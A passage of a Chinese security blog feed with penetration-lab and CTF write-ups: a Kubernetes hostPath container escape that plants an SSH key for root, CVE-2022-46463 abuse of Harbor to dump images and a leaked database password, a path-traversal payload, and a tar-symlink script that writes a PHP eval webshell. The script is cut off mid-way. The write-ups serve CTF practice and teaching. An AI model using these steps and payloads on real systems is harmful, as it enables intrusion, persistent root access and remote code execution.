class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>同样，用 <code>nginx:1.8</code> 镜像创建名为 nginx-deployment 的 pod，将宿主机的目录挂载到 /mnt 目录。新建 test.yaml 文件，内容如下：</p><pre class="line-numbers language-none"><code class="language-none">apiVersion: v1kind: Podmetadata:  name: nginx-deploymentspec:  containers:  - image: nginx:1.8    name: container    volumeMounts:    - mountPath: /mnt      name: xianxinshh  volumes:  - name: test    hostPath:      path: /<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>创建 pod 并查看运行情况：</p><pre class="line-numbers language-none"><code class="language-none">kubectl --insecure-skip-tls-verify -s https://172.22.14.37:6443/ apply -f test.yaml<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">kubectl --insecure-skip-tls-verify -s https://172.22.14.37:6443/ get pods<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>写入 SSH 公钥（我们登上的和ssh上的不一样，这次连上的root里没flag,ssh上就能看见）</p><pre class="line-numbers language-none"><code class="language-none">kubectl --insecure-skip-tls-verify -s https://172.22.14.37:6443/ exec -it nginx-deployment -- /bin/bash-----root@nginx-deployment:/# echo "ssh-rsa YOUR_KEY_HERE" &gt; /mnt/root/.ssh/authorized_keys<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>先在本地机子创建rsa密钥</p><pre class="line-numbers language-none"><code class="language-none">ssh-keygen -t rsa -b 4096<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://fushuling-1309926051.cos.ap-shanghai.myqcloud.com/2023/10/19.png" alt="img"></p><p>可以看到我生成的公私钥创建在了/home/fushuling/.ssh/目录下，/home/fushuling/.ssh/id_rsa.pub的内容就是我们要写入的公钥</p><p><img src="https://fushuling-1309926051.cos.ap-shanghai.myqcloud.com/2023/10/20.png" alt="img"></p><p>在弹的shell上执行：</p><pre class="line-numbers language-none"><code class="language-none">cd /rootmkdir .ssh<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>然后把公钥传进去</p><pre class="line-numbers language-none"><code class="language-none">echo "公钥内容" &gt;&gt;/root/.ssh/authorized_keys<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>接下来回到我们本地的机子上，就能用私钥连接上去了</p><p><img src="https://fushuling-1309926051.cos.ap-shanghai.myqcloud.com/2023/10/21.png" alt="img"></p><p>当然，我们也可以把id_rsa的内容保存出来用xshell连上去，我后面就这么打的</p></blockquote><p>通过公钥 SSH 连接：</p><pre class="line-numbers language-none"><code class="language-none">ssh -i id_rsa root@172.22.14.37<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>当前目录存在 <code>.mysql_history</code>：</p><pre class="line-numbers language-none"><code class="language-none">root@ubuntu-k8s（ssh上有这个k8s）:~# cat .mysql_history_HiStOrY_V2_show\040databases;create\040database\040flaghaha;use\040flaghahaDROP\040TABLE\040IF\040EXISTS\040`f1ag`;CREATE\040TABLE\040`flag06`\040(`id`\040int\040DEFAULT\040NULL,\040\040`f1agggggishere`\040varchar(255)\040DEFAULT\040NULL)\040ENGINE=MyISAM\040DEFAULT\040CHARSET=utf8;CREATE\040TABLE\040`flag06`\040(\040`id`\040int\040DEFAULT\040NULL,\040\040\040`f1agggggishere`\040varchar(255)\040DEFAULT\040NULL\040)\040ENGINE=MyISAM\040DEFAULT\040CHARSET=utf8;show\040tables;drop\040table\040flag06;DROP\040TABLE\040IF\040EXISTS\040`f1ag`;CREATE\040TABLE\040`flag04`\040(`id`\040int\040DEFAULT\040NULL,\040\040`f1agggggishere`\040varchar(255)\040DEFAULT\040NULL)\040ENGINE=MyISAM\040DEFAULT\040CHARSET=utf8;CREATE\040TABLE\040`flag04`\040(\040`id`\040int\040DEFAULT\040NULL,\040\040\040`f1agggggishere`\040varchar(255)\040DEFAULT\040NULL\040)\040ENGINE=MyISAM\040DEFAULT\040CHARSET=utf8;INSERT\040INTO\040`flag`\040VALUES\040(1,\040'ZmxhZ3tkYTY5YzQ1OS03ZmU1LTQ1MzUtYjhkMS0xNWZmZjQ5NmEyOWZ9Cg==');INSERT\040INTO\040`flag04`\040VALUES\040(1,\040'ZmxhZ3tkYTY5YzQ1OS03ZmU1LTQ1MzUtYjhkMS0xNWZmZjQ5NmEyOWZ9Cg==');exit<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/6e15ee518fda117f7a03d899df6db887.png"></p><pre class="line-numbers language-none"><code class="language-none">flag{da69c459-7fe5-4535-b8d1-15fff496a29f}<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><hr><h5 id="k8s"><a href="#k8s" class="headerlink" title="k8s"></a>k8s</h5><p>本质是<strong>Kubernetes 容器逃逸攻击</strong>的一种典型场景 —— 核心是利用 K8s 权限配置漏洞，让恶意容器获取宿主机的完全访问权，最终通过 “写入 SSH 公钥” 实现对宿主机的长期控制。下面用 “大白话 + 步骤拆解” 讲清楚每一步的逻辑，为什么能成、背后原理是什么：</p><p>先明确前提：这种攻击能成功，需要 K8s 集群存在 “权限配置错误”</p><p>正常情况下，K8s 容器是 “隔离” 的 —— 容器里的操作只能在自己的 “小环境” 里，不能随便访问宿主机的文件 / 资源。但如果管理员配置失误（比如给容器开了过高权限），就会给攻击者可乘之机。<br>常见的 “危险配置” 有两种（也是这种攻击的前提）：</p><ol><li>容器以<code>privileged: true</code>（特权模式）启动：相当于容器拥有宿主机的 root 权限，能直接操作宿主机内核 / 硬件；</li><li>容器挂载了宿主机的<code>/</code>目录（根目录）：把宿主机的所有文件（比如<code>/etc</code>用户配置、<code>/root</code>管理员目录）“映射” 到容器里，容器改挂载目录的文件，就等于改宿主机的文件。</li></ol><p>第一步：写 “evil-deployment.yaml”—— 本质是定义一个 “恶意容器” 的启动规则</p><p>“deployment.yaml” 是 K8s 里用来定义 “怎么启动容器” 的配置文件（比如启动多少个容器、用什么镜像、给什么权限）。<br>“evil”（恶意）的核心，就是在配置里加两个 “危险项”：</p><pre class="line-numbers language-yaml" data-language="yaml"><code class="language-yaml"><span class="token comment"># evil-deployment.yaml 关键内容（简化版）</span><span class="token key atrule">apiVersion</span><span class="token punctuation">:</span> apps/v1<span class="token key atrule">kind</span><span class="token punctuation">:</span> Deployment<span class="token key atrule">metadata</span><span class="token punctuation">:</span>  <span class="token key atrule">name</span><span class="token punctuation">:</span> evil<span class="token punctuation">-</span>container  <span class="token comment"># 恶意容器的名字</span><span class="token key atrule">spec</span><span class="token punctuation">:</span>  <span class="token key atrule">replicas</span><span class="token punctuation">:</span> <span class="token number">1</span>  <span class="token comment"># 启动1个容器</span>  <span class="token key atrule">template</span><span class="token punctuation">:</span>    <span class="token key atrule">spec</span><span class="token punctuation">:</span>      <span class="token key atrule">containers</span><span class="token punctuation">:</span>      <span class="token punctuation">-</span> <span class="token key atrule">name</span><span class="token punctuation">:</span> evil<span class="token punctuation">-</span>box        <span class="token key atrule">image</span><span class="token punctuation">:</span> ubuntu<span class="token punctuation">:</span>latest  <span class="token comment"># 用一个常见的Linux镜像（比如Ubuntu）</span>        <span class="token comment"># 危险配置1：挂载宿主机的根目录“/”到容器的“/mnt”目录</span>        <span class="token key atrule">volumeMounts</span><span class="token punctuation">:</span>        <span class="token punctuation">-</span> <span class="token key atrule">name</span><span class="token punctuation">:</span> host<span class="token punctuation">-</span>root  <span class="token comment"># 挂载卷的名字（自定义）</span>          <span class="token key atrule">mountPath</span><span class="token punctuation">:</span> /mnt  <span class="token comment"># 容器里的目录（挂载后，访问/mnt就等于访问宿主机/）</span>        <span class="token comment"># 危险配置2：开启特权模式（如果没开挂载，特权模式也能间接逃逸）</span>        <span class="token key atrule">securityContext</span><span class="token punctuation">:</span>          <span class="token key atrule">privileged</span><span class="token punctuation">:</span> <span class="token boolean important">true</span>      <span class="token comment"># 定义要挂载的宿主机目录</span>      <span class="token key atrule">volumes</span><span class="token punctuation">:</span>      <span class="token punctuation">-</span> <span class="token key atrule">name</span><span class="token punctuation">:</span> host<span class="token punctuation">-</span>root        <span class="token key atrule">hostPath</span><span class="token punctuation">:</span>          <span class="token key atrule">path</span><span class="token punctuation">:</span> /  <span class="token comment"># 宿主机的根目录（这是关键！把宿主机所有文件映射进去）</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>为什么要这么写？</p><ul><li><code>volumeMounts</code> + <code>hostPath: path: /</code>：相当于把宿主机的 “C 盘”（如果是 Linux 宿主机就是根目录）整个 “复制” 到容器的<code>/mnt</code>目录下。比如在容器里改<code>/mnt/root/.ssh/authorized_keys</code>，就等于改宿主机<code>root</code>用户的 SSH 授权文件。</li><li><code>privileged: true</code>：就算挂载有问题，特权容器也能通过修改宿主机内核参数、挂载设备等方式逃逸，相当于给容器 “万能钥匙”。</li></ul><p>第二步：部署恶意容器到 K8s 集群，实现 “宿主机目录挂载”</p><p>攻击者拿到这个<code>evil-deployment.yaml</code>后，需要执行 K8s 命令，让集群启动这个恶意容器：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 在K8s集群里执行（需要有创建deployment的权限，比如被劫持的service account权限）</span>kubectl apply <span class="token parameter variable">-f</span> evil-deployment.yaml<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>执行后，K8s 会在某个宿主机上启动这个容器，并且按照配置：</p><ul><li>宿主机的<code>/</code>目录 → 挂载到容器的<code>/mnt</code>目录；</li><li>容器拥有宿主机的 root 权限（特权模式）。</li></ul><p>第三步：进入恶意容器，给宿主机 root 用户 “写 SSH 公钥”—— 实现长期控制</p><p>这一步是 “逃逸的核心目标”：既然能访问宿主机的所有文件，那只要给宿主机的<code>root</code>用户（最高权限）添加攻击者的 SSH 公钥，攻击者后续就能直接用 SSH 登录宿主机，不用再依赖 K8s。</p><p>具体操作（在容器内部执行）：</p><ol><li><p><strong>生成 SSH 密钥对</strong>（如果攻击者本地没有）：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 容器里执行（其实本地生成好公钥传进来更隐蔽）</span>ssh-keygen <span class="token parameter variable">-t</span> rsa  <span class="token comment"># 一路按回车，生成私钥id_rsa、公钥id_rsa.pub</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li><li><p><strong>把攻击者的公钥，写入宿主机 root 用户的 SSH 授权文件</strong>：<br>宿主机 root 用户的 SSH 授权文件路径是<code>/root/.ssh/authorized_keys</code>，而容器里访问这个文件的路径是<code>/mnt/root/.ssh/authorized_keys</code>（因为挂载了宿主机 / 到 /mnt）。<br>执行命令：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 把公钥内容追加到宿主机的authorized_keys里</span><span class="token function">cat</span> ~/.ssh/id_rsa.pub <span class="token operator">&gt;&gt;</span> /mnt/root/.ssh/authorized_keys<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li><li><p><strong>验证效果</strong>：<br>攻击者现在可以用自己的 SSH 私钥，直接登录宿主机的 root 用户：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 攻击者本地执行（知道宿主机IP即可）</span><span class="token function">ssh</span> <span class="token parameter variable">-i</span> 自己的私钥文件 root@宿主机IP<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>因为宿主机 root 的 authorized_keys 里有攻击者的公钥，所以能直接登录 —— 这就实现了 “从 K8s 容器逃逸到宿主机，并且长期控制”。</p></li><li><p><strong>K8s 的基本概念</strong>：不知道 deployment 是 “启动容器的配置”、hostPath 挂载是 “把宿主机目录映射到容器”；</p></li><li><p><strong>SSH 登录的原理</strong>：不知道<code>authorized_keys</code>是 “允许谁登录的白名单”，只要公钥在这个文件里，持有对应私钥的人就能免密码登录。</p></li></ol><p>管理员配置失误（给容器开特权 + 挂载宿主机根目录）→ 攻击者利用配置创建恶意容器 → 容器里访问宿主机文件 → 给宿主机 root 写 SSH 公钥 → 后续 SSH 直接登录宿主机。</p><hr><h3 id="flag05"><a href="#flag05" class="headerlink" title="flag05"></a>flag05</h3><p><a href="https://github.com/404tk/CVE-2022-46463">https://github.com/404tk/CVE-2022-46463</a></p><p>存在 Harbor 公开镜像仓库未授权访问 CVE-2022-46463。Linux 环境下运行 <a href="https://github.com/404tk/CVE-2022-46463">harbor.py</a>：</p><pre class="line-numbers language-none"><code class="language-none">┌──(kali㉿kali)-[~/桌面/tools/ma]└─$ proxychains python3 harbor.py http://172.22.14.46[proxychains] config file found: /etc/proxychains4.conf[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4[proxychains] DLL init: proxychains-ng 4.17[proxychains] Strict chain  ...  127.0.0.1:12345  ...  172.22.14.46:80  ...  OK[*] API version used v2.0[proxychains] Strict chain  ...  127.0.0.1:12345  ...  172.22.14.46:80  ...  OK[+] project/projectadmin[+] project/portal[+] library/nginx[+] library/redis[+] harbor/secret<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>下载secret镜像</p><pre class="line-numbers language-none"><code class="language-none">┌──(kali㉿kali)-[~/桌面/tools/ma]└─$ proxychains python3 harbor.py http://172.22.14.46 --dump harbor/secret --v2[proxychains] config file found: /etc/proxychains4.conf[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4[proxychains] DLL init: proxychains-ng 4.17[proxychains] Strict chain  ...  127.0.0.1:12345  ...  172.22.14.46:80  ...  OK[proxychains] Strict chain  ...  127.0.0.1:12345  ...  172.22.14.46:80  ...  OK[+] Dumping : harbor/secret:latest[proxychains] Strict chain  ...  127.0.0.1:12345  ...  172.22.14.46:80  ...  OK[proxychains] Strict chain  ...  127.0.0.1:12345  ...  172.22.14.46:80  ...  OK    [+] Downloading : 58690f9b18fca6469a14da4e212c96849469f9b1be6661d2342a4bf01774aa50/home/kali/桌面/tools/ma/harbor.py:128: DeprecationWarning: Python 3.14 will, by default, filter extracted tar archives and reject files or modify their metadata. Use the filter argument to control this behavior.  tf.extractall(f"{CACHE_PATH}{dir}/{name}")[Errno 1] Operation not permitted[proxychains] Strict chain  ...  127.0.0.1:12345  ...  172.22.14.46:80  ...  OK    [+] Downloading : b51569e7c50720acf6860327847fe342a1afbe148d24c529fb81df105e3eed01[proxychains] Strict chain  ...  127.0.0.1:12345  ...  172.22.14.46:80  ...  OK    [+] Downloading : da8ef40b9ecabc2679fe2419957220c0272a965c5cf7e0269fa1aeeb8c56f2e1[proxychains] Strict chain  ...  127.0.0.1:12345  ...  172.22.14.46:80  ...  OK    [+] Downloading : fb15d46c38dcd1ea0b1990006c3366ecd10c79d374f341687eb2cb23a2c8672e[proxychains] Strict chain  ...  127.0.0.1:12345  ...  172.22.14.46:80  ...  OK    [+] Downloading : 413e572f115e1674c52e629b3c53a42bf819f98c1dbffadc30bda0a8f39b0e49[proxychains] Strict chain  ...  127.0.0.1:12345  ...  172.22.14.46:80  ...  OK    [+] Downloading : 8bd8c9755cbf83773a6a54eff25db438debc22d593699038341b939e73974653<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>镜像在caches里</p><p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/617d8df22447e20ba4f8452271ea2d13.png"></p><hr><h3 id="flag06"><a href="#flag06" class="headerlink" title="flag06"></a>flag06</h3><p>下载projectadmin镜像</p><pre class="line-numbers language-none"><code class="language-none">proxychains python3 harbor.py http://172.22.14.46 --dump project/projectadmin --v2 [proxychains] config file found: /etc/proxychains4.conf[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4[proxychains] DLL init: proxychains-ng 4.17[proxychains] Strict chain  ...  127.0.0.1:12345  ...  172.22.14.46:80  ...  OK[proxychains] Strict chain  ...  127.0.0.1:12345  ...  172.22.14.46:80  ...  OK[+] Dumping : project/projectadmin:latest[proxychains] Strict chain  ...  127.0.0.1:12345  ...  172.22.14.46:80  ...  OK[proxychains] Strict chain  ...  127.0.0.1:12345  ...  172.22.14.46:80  ...  OK    [+] Downloading : 63e9bbe323274e77e58d77c6ab6802d247458f784222fbb07a2556d6ec74ee05/home/kali/桌面/tools/ma/harbor.py:128: DeprecationWarning: Python 3.14 will, by default, filter extracted tar archives and reject files or modify their metadata. Use the filter argument to control this behavior.  tf.extractall(f"{CACHE_PATH}{dir}/{name}")[proxychains] Strict chain  ...  127.0.0.1:12345  ...  172.22.14.46:80  ...  OK    [+] Downloading : a1ae0db7d6c6f577c8208ce5b780ad362ef36e69d068616ce9188ac1cc2f80c6[proxychains] Strict chain  ...  127.0.0.1:12345  ...  172.22.14.46:80  ...  OK    [+] Downloading : 70437571d98143a3479eaf3cc5af696ea79710e815d16e561852cf7d429736bd[proxychains] Strict chain  ...  127.0.0.1:12345  ...  172.22.14.46:80  ...  OK    [+] Downloading : ae0fa683fb6d89fd06e238876769e2c7897d86d7546a4877a2a4d2929ed56f2c[proxychains] Strict chain  ...  127.0.0.1:12345  ...  172.22.14.46:80  ...  OK    [+] Downloading : 90d3d033513d61a56d1603c00d2c9d72a9fa8cfee799f3b1737376094b2f3d4c<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>发现运行了 <code>run.sh</code></p><pre class="line-numbers language-none"><code class="language-none">┌──(kali㉿kali)-[~/…/ma/caches/project_projectadmin/latest]└─$ cat 90d3d033513d61a56d1603c00d2c9d72a9fa8cfee799f3b1737376094b2f3d4c/run.sh #!/bin/bashsleep 1# startjava -jar /app/ProjectAdmin-0.0.1-SNAPSHOT.jar/usr/bin/tail -f /dev/null           <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>将<code>ProjectAdmin-0.0.1-SNAPSHOT.jar</code>导入<code>IDEA</code>（将<code>jar</code>放进项目下，右键添加为库）</p><pre class="line-numbers language-none"><code class="language-none">spring.datasource.username=rootspring.datasource.password=My3q1i4oZkJm3<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>在 SpringBoot 配置文件 <code>application.properties</code> 中找到数据库账号密码</p><p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/1b040e1bbb8c9c34013d6a518560748b.png"></p><pre class="line-numbers language-none"><code class="language-none">proxychains python3 harbor.py http://172.22.14.46 --dump project/projectadmin --v2 <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">java -jar Multiple.Database.Utilization.Tools-2.1.1-jar-with-dependencies.jar<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>然后MDUT直接连，再UDF提权下即可</p><p>（不要用MDUT内置的sock，用proxychains/proxifier)</p><p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/0f6efe4b61c332bba4d1abade299bcb4.png"></p><p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/652c2caa4d37db4ef6fd4cdf55b39afe.png"></p><hr>]]></content>
      
      
      <categories>
          
          <category> 网安 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 春秋云镜 </tag>
            
            <tag> 渗透 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>长城杯1</title>
      <link href="/2025/09/13/chang-cheng-bei/"/>
      <url>/2025/09/13/chang-cheng-bei/</url>
      
        <content type="html"><![CDATA[<h3 id="文曲签学"><a href="#文曲签学" class="headerlink" title="文曲签学"></a>文曲签学</h3><p>长按Fn键激活特殊模式</p><p><code>read HINT</code>提示去公众号拿</p><blockquote><p>提示：<br>flag在/flag下，可以尝试目录穿越漏洞来读取它。<br>会过滤“../”，可以使用双写来绕过。<br>文件名有大小写区分。</p></blockquote><p>于是</p><pre class="line-numbers language-none"><code class="language-none">read ....//....//....//....//flagHere is my flag for you:flag{adc07144-74e1-457e-a804-8ebc1e2cd3ad}When I learn it well, I will pass on this persistence to you too.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h3 id="EZ-upload"><a href="#EZ-upload" class="headerlink" title="EZ_upload"></a>EZ_upload</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function-definition function">handleFileUpload</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$uploadDirectory</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'/tmp/'</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'error'</span><span class="token punctuation">]</span> <span class="token operator">!==</span> <span class="token constant">UPLOAD_ERR_OK</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token string single-quoted-string">'文件上传失败。'</span><span class="token punctuation">;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token function">basename</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/[^a-zA-Z0-9_\-\.]/'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'_'</span><span class="token punctuation">,</span> <span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token string single-quoted-string">'文件名不符合要求。'</span><span class="token punctuation">;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token variable">$destination</span> <span class="token operator">=</span> <span class="token variable">$uploadDirectory</span> <span class="token operator">.</span> <span class="token variable">$filename</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$destination</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token function">exec</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'cd /tmp &amp;&amp; tar -xvf '</span> <span class="token operator">.</span> <span class="token variable">$filename</span><span class="token operator">.</span><span class="token string single-quoted-string">'&amp;&amp;pwd'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token variable">$destination</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token string single-quoted-string">'文件移动失败。'</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token function">handleFileUpload</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>打软连接即可</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> tarfile<span class="token keyword">import</span> os<span class="token keyword">from</span> io <span class="token keyword">import</span> BytesIO<span class="token comment"># --- 配置 ---</span><span class="token comment"># Webshell 的内容</span>webshell_content <span class="token operator">=</span> <span class="token string">b'&lt;?php @eval($_POST["cmd"]); ?&gt;'</span><span class="token comment"># Webshell 的文件名</span>webshell_name <span class="token operator">=</span> <span class="token string">"1.php"</span><span class="token comment"># 第一个包要创建的符号链接的名字（在 /tmp 目录下）</span>symlink_name <span class="token operator">=</span> <span class="token string">"link"</span><span class="token comment"># 符号链接要指向的目标目录</span>target_dir <span class="token operator">=</span> <span class="token string">"/var/www/html"</span><span class="token comment"># --- 脚本开始 ---</span><span class="token comment"># 1. 创建第一个 tar 包 (symlink.tar)，用于建立符号链接</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"正在创建 symlink.tar..."</span></span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"这个包将在 /tmp 目录下创建一个符号链接 '</span><span class="token interpolation"><span class="token punctuation">{</span>symlink_name<span class="token punctuation">}</span></span><span class="token string">' 指向 '</span><span class="token interpolation"><span class="token punctuation">{</span>target_dir<span class="token punctuation">}</span></span><span class="token string">'"</span></span><span class="token punctuation">)</span><span class="token keyword">with</span> tarfile<span class="token punctuation">.</span><span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"pass1.tar"</span><span class="token punctuation">,</span> <span class="token string">"w"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> tar<span class="token punctuation">:</span>    <span class="token comment"># 创建一个 TarInfo 对象来定义符号链接的元数据</span>    symlink_info <span class="token operator">=</span> tarfile<span class="token punctuation">.</span>TarInfo<span class="token punctuation">(</span>name<span class="token operator">=</span>symlink_name<span class="token punctuation">)</span>    symlink_info<span class="token punctuation">.</span><span class="token builtin">type</span> <span class="token operator">=</span> tarfile<span class="token punctuation">.</span>SYMTYPE  <span class="token comment"># 类型设置为符号链接</span>    symlink_info<span class="token punctuation">.</span>linkname <span class="token operator">=</span> target_dir   <span class="token comment"># 链接的目标路径</span>    tar<span class="token punctuation">.</span>addfile<span class="token punctuation">(</span>symlink_info<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"symlink.tar 创建成功！"</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"-"</span> <span class="token operator">*</span> <span class="token number">30</span><span class="token punctuation">)</span><span class="token comment"># 2. 创建第二个 tar 包 (webshell.tar)，用于写入 Webshell</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"正在创建 webshell.tar..."</span></span><span class="token punctuation">)</span><span class="token comment"># Webshell 在包内的路径将通过符号链接来写入</span>path_in_tar <span class="token operator">=</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>join<span class="token punctuation">(</span>symlink_name<span class="token punctuation">,</span> webshell_name<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"这个包将把 '</span><span class="token interpolation"><span class="token punctuation">{</span>webshell_name<span class="token punctuation">}</span></span><span class="token string">' 写入到路径 '</span><span class="token interpolation"><span class="token punctuation">{</span>path_in_tar<span class="token punctuation">}</span></span><span class="token string">'"</span></span><span class="token punctuation">)</span><span class="token keyword">with</span> tarfile<span class="token punctuation">.</span><span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"pass2.tar"</span><span class="token punctuation">,</span> <span class="token string">"w"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> tar<span class="token punctuation">:</span>    <span class="token comment"># 创建一个 TarInfo 对象来定义文件的元数据</span>    file_info <span class="token operator">=</span> tarfile<span class="token punctuation">.</span>TarInfo<span class="token punctuation">(</span>name<span class="token operator">=</span>path_in_tar<span class="token punctuation">)</span>    file_info<span class="token punctuation">.</span>size <span class="token operator">=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>webshell_content<span class="token punctuation">)</span>    <span class="token comment"># 使用 BytesIO 将内存中的 Webshell 内容添加到 tar 包中</span>    tar<span class="token 